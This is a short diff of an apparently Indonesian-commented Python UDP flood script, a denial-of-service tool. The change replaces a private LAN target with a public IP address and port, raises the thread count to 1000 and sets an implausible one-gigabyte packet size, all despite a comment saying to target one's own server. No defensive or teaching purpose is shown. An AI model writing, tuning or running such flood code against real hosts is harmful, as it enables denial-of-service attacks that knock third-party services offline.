@@ -3,14 +3,14 @@ import random
 import threading
 
 # Ganti dengan IP dan port server milikmu
-TARGET_IP = "192.168.1.10"
-TARGET_PORT = 80
+TARGET_IP = "204.10.193.119"
+TARGET_PORT = 7132
 
 # Jumlah thread paralel
-THREADS = 50
+THREADS = 1000
 
 # Ukuran paket (dalam byte)
-PACKET_SIZE = 1024
+PACKET_SIZE = 1000000000
 
 def udp_flood():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
